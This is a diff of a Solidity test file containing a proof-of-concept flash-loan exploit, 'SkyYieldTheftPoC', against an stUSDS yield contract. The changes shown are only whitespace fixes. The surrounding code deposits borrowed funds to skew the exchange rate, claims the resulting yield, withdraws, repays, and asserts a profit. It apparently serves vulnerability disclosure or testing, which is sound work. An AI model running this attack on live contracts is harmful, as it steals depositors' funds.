@@ -39,7 +39,7 @@ contract SkyYieldTheftPoC is Test {
         uint256 fee,
         bytes calldata /* params */
     ) external returns (bool) {
-        
+
         // A. Deposit enormous amounts to artificially shift exchange rate
         stUSDS.deposit(amount, address(this));
 
@@ -50,7 +50,7 @@ contract SkyYieldTheftPoC is Test {
         // C. Claim yield generated instantly by rate imbalance
         stUSDS.claimYield();
 
-        // D. Withdraw the initial deposit 
+        // D. Withdraw the initial deposit
         stUSDS.withdraw(amount, address(this), address(this));
 
         // E. Repay Flashloan
@@ -62,7 +62,7 @@ contract SkyYieldTheftPoC is Test {
         uint256 preBalance = address(this).balance;
         this.attack();
         uint256 postBalance = address(this).balance;
-        
+
         assertTrue(postBalance > preBalance, "PoC Failed: No yield extracted");
     }
 }
